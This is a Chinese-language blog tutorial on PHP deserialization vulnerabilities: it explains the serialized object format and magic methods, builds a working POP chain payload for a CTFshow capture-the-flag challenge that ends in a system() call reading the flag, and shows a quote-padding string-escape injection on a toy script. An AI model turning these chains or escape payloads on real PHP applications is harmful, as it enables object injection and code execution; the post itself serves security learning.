---
layout: post
title: PHP-unserialize
date: 2023-11-20 10:54 +0800
categories:
- Web_security
tags:
- PHP
- 反序列化
---
## 0x00 序列化/反序列化：
把对象转换为字节序列的过程称为对象的**序列化**

将字节序列恢复为对象的过程称为对象的**反序列化**

对象的序列化主要用途：

- [x] *将对象的字节序列化保存在硬盘上*
- [x] *在网络上传输对象的字节序列（Session的使用）*

### 反序列化的过程：

![image-20231128110148736](/images/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20231128110148736.png)

```php
O:7:"example":3:{s:1:"a";s:1:"1";s:4:"%00*%00b";s:5:"ThisB";s:10:"%00example%00c";s:5:"ThisC";}
```

*对象序列化后的结构为：O:对象名的长度:"对象名":对象属性个数:{s:属性名的长度:"属性名";s:属性值的长度:"属性值";}*

1. a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。
2. b是protected类型的变量，它的变量名长度为4，也就是b前添加了`%00*%00`。所以，protected属性的表示方式是在变量名前加上`%00*%00`。
3. c是private类型的变量，c的变量名前添加了`%00类名%00`。所以，private属性的表示方式是在变量名前加上`%00类名%00`。
4. 虽然Test类中有test1方法，但是，序列化得到的字符串中，只保存了公有变量a，保护变量b和私有变量c，并没保存类中的方法。也可以看出，序列化不保存方法。

### 反序列化中的魔术方法：

```php
PHP魔术方法总览:
__construct() 当创建对象时触发,一般用于初始化对象,对变量赋初值
__sleep() 使用serialize()时自动触发 
__wakeup() 使用unserialize()时自动触发  (注:当php版本低时可以绕过)
__destruct() 当一个对象被销毁时触发
__toString() 当一个类被当成字符串使用时触发
__invoke() 当尝试以调用函数的方式调用一个对象时触发
__call() 在对象上下文中调用不可访问的方法时触发 
__callStatic() 在静态上下文中调用不可访问的方法时触发 
__get() 用于从不可访问的属性读取数据
__set() 用于将数据写入不可访问的属性
__isset() 在不可访问的属性上调用isset()或empty()触发
__unset() 在不可访问的属性上使用unset()时触发
```

## 0x01 进阶难度之POP链

这里我拿 CTFshow 中《Web逃离计划》这道题的源码，进行Pop链的学习。先上代码吧，题目中的POP链问题 主要是由这两部分代码构成：
### 代码
```php
//index.php
<?php
include "class.php";
include "ezwaf.php";     // 存放着一些过滤函数，和pop函数的构造无关，所以暂不展示
session_start();
$username = $_POST['username'];
$password = $_POST['password'];
$finish = false;
if ($username!=null&&$password!=null){
    $serData = checkLogData(checkData(get(serialize(new Login($username,$password)))));
    $login = unserialize($serData);
    $loginStatus = $login->checkStatus();
    if ($loginStatus){
        $_SESSION['login'] = true;
        $_COOKIE['status'] = 0;
    }
    $finish = true;
}
?>
```

```php
//class.php
<?php
error_reporting(0);

class Login{
    protected $user_name;
    protected $pass_word;
    protected $admin;
    public function __construct($username,$password){
        $this->user_name=$username;
        $this->pass_word=$password;
        if ($this->user_name=='admin'&&$this->pass_word=='admin888'){
            $this->admin = 1;
        }else{
            $this->admin = 0;
        }
    }
    public function checkStatus(){
        return $this->admin;
    }
}

class register{
    protected $username;
    protected $password;
    protected $mobile;
    protected $mdPwd;

    public function __construct($username,$password,$mobile){
        $this->username = $username;
        $this->password = $password;
        $this->mobile = $mobile;
    }

    public function __toString(){
        return $this->mdPwd->pwd;
    }
}

class magic{
    protected $username;

    public function __get($key){
        if ($this->username!=='admin'){
            die("what do you do?");
        }
        $this->getFlag($key);
    }

    public function getFlag($key){
        echo $key."</br>";
        system("cat /flagg");
    }


}

class PersonalFunction{
    protected $username;
    protected $password;
    protected $func = array();

    public function __construct($username, $password,$func = "personalData"){
        $this->username = $username;
        $this->password = $password;
        $this->func[$func] = true;
    }

    public function checkFunction(array $funcBars) {
        $retData = null;

        $personalProperties = array_flip([                  //转换后的$persionalProperties[]=[
            'modifyPwd', 'InvitationCode',                  //    'modifyPwd' => 0, 
            'modifyAvatar', 'personalData',                 //    'InvitationCode' => 1,
                                                            //    'modifyAvatar' => 2, 
                                                            //    'personalData' => 3
        ]);                                                 //]

        foreach ($personalProperties as $item => $num){
            foreach ($funcBars as $funcBar => $stat) {        //这是一个foreach循环，它遍历$funcBars数组，将每个元素的键赋值给$funcBar，将每个元素的值赋值给$stat。
                if (stristr($stat,$item)){
                    $retData = true;
                }
            }
        }


        return $retData;
    }

    public function doFunction($function){
        // TODO: 出题人提示：一个未完成的功能，不用管这个，单纯为了逻辑严密.
        return true;
    }


    public function __destruct(){
        $retData = $this->checkFunction($this->func);
        $this->doFunction($retData);

    }
}
```

### 代码审计

先来分析 `index.php`文件的内容，关键看 `$serData`属性，先是利用`Login()`方法返回序列化的值；`Login()`方法产生在 `class.php`文件中，用于判断用户名和密码是否正确，并返回`$admin`状态值。

通览整个 `class.php`文件，其实我们关注到的重点是 **magic**类中存在 `system("cat /flagg");` 打印flag。那么我们该如何触发 `getFlag()`方法呢？它被使用在 `__get()`方法中（*__get() 用于从不可访问的属性读取数据*）谁能够触发这个方法呢？答案在 **register**类中， `__toString()`方法中的`return $this->mdPwd->pwd;`满足，所以需要让 `mdPwd`作为**magic** 类的一个对象就可以触发；继续往上推，谁能够触发这个`__toString()`方法呢？在**PersonalFunction**类中，存在`checkFunction()`方法，内部存在`stristr()`函数，被 `__destruct()`自动调用了，传入的值是一个数组，那么只需要让`stristr()`函数处理**regitster**类即可自动触发 `__toString`

![image-20231128003245690](/images/Web%E9%80%83%E7%A6%BB%E8%AE%A1%E5%88%92%20%E6%80%9D%E8%B7%AF.assets/image-20231128003245690.png){: w="800" h="800" }

那么让register类的对象经过该函数处理即可。触发流程如下：

`PersonalFunction.__destruct() -> checkFunction() -> register.__toString() -> magic.__get($key) -> getFlag() `

**register** 类里：`mdpwd=new  magic()`;

**PersonalFunction** 的 `checkFunction()` 方法里面的数组参数都需要构造为 **register** 的对象

于是构造POP链：

```php
<?php
class register{
    protected $username;
    protected $password;
    protected $mobile;
    protected $mdPwd;
    public function __construct(){
        $this->username = "admin";
        $this->password = "123";
        $this->mobile = "133";
        $this->mdPwd = new magic();
    }
}
 
class magic{
    protected $username="admin";
}
 
class PersonalFunction{
    protected $username;
    protected $password;
    protected $func;
    public function __construct($func){
        $this->username = "admin";
        $this->password = "123";
        $this->func=$func;
    }
}
 
$b=new register();
$a=array($b);
$c=new PersonalFunction($a);
```

得到结果：

```php
O:16:"PersonalFunction":3:{s:11:"%00*%00username";s:5:"admin";s:11:"%00*%00password";s:3:"123";s:7:"%00*%00func";a:1:{i:0;O:8:"register":4:{s:11:"%00*%00username";s:5:"admin";s:11:"%00*%00password";s:3:"123";s:9:"%00*%00mobile";s:3:"133";s:8:"%00*%00mdPwd";O:5:"magic":1:{s:11:"%00*%00username";s:5:"admin";}}}}
```


## 0x02 终极难度之字符逃逸

### 前置知识：
- ​     在PHP反序列化过程中，底层代码以 `;`作为字段的分割，以 `}`作为结尾（字符串除外），并且是根据长度判断内容

- ​     字符逃逸的标志： 

  1. 序列化的对象可以控制  
  2. 过滤函数在序列化之后，反序列化之前 

### 从一个简单的例子开始吧：

```php
<?php

	$username = $_GET['username'];
	$sign = "hi guys";
	$user = array($username, $sign);

	$seri = bad_str(serialize($user));

	echo $seri;

	$user=unserialize($seri);
    echo "<br>";
	echo $user[0];
	echo "<br>";
	echo $user[1];

	//过滤方法：
	function bad_str($string){
		return preg_replace('/\'/', 'no', $string);
	}
?>
```

在这段代码中，先序列化$user 对象再利用bad_str()方法进行过滤，最后反序列化输出结果。bad_str()方法将匹配到的 `/\'/` 全部转换为no，相当于多一个字符（这是实现字符逃逸的一个标志）

接下来看看输入`username = admin` 的结果：

![image-20231116144454178](/images/PHP-反序列化.assets/image-20231116144454178.png){: w="800" h="400" }

如果此时，想要让它显示 `hi girls`呢？这就用的上字符串逃逸了，其核心思路是 **利用bad_str()方法构造显示 `hi girls`的字段**，先看看要构造的部分：

![image-20231116155727268](/images/PHP-反序列化.assets/image-20231116155727268.png){: w="800" h="400" }

观察后得到我们需要构造的一部分内容： `";i:1;s:8:"hi girls";}` （长度22）

看看输入 `username = ";i:1;s:8:"hi girls";}`的效果：

![image-20231116161701372](/images/PHP-反序列化.assets/image-20231116161701372.png){: w="800" h="400" }

可以看到，输入的 ` username `值被当作了字符串，利用bad_str()方法构造一部分内容x，使它能够拼接在这个<u>位置1</u>，把后面这部分内容 `";i:1;s:7:"hi guys";}` 溢出

![image-20231116162730151](/images/PHP-反序列化.assets/image-20231116162730151.png){: w="800" h="400" }

点子来了，bad_str()方法正好可以在反序列化之前多一个字符，那么我输入22个` ' `  填充进 `username  `就可以了，即`username=''''''''''''''''''''''";i:1;s:8:"hi girls";}`（长度为44），这次再看看结果：

![image-20231116163815050](/images/PHP-反序列化.assets/image-20231116163815050.png){: w="800" h="400" }

可以看到输出变成了 `hi girls`,完成了我们的目标~


### 如何判断添加/减少多少字符？

**字符数=目标字符串数/字符差数** (注：不满整数时需要自行添加字符凑整)

> 参考文章：
> 1. [从一道ctf看php反序列化漏洞的应用场景](https://www.cnblogs.com/litlife/p/11690918.html)
> 2. [Web逃离计划题解](https://www.cnblogs.com/erR0Ratao/p/14439131.html)
> 3. [php反序列化完整总结](https://xz.aliyun.com/t/12507)

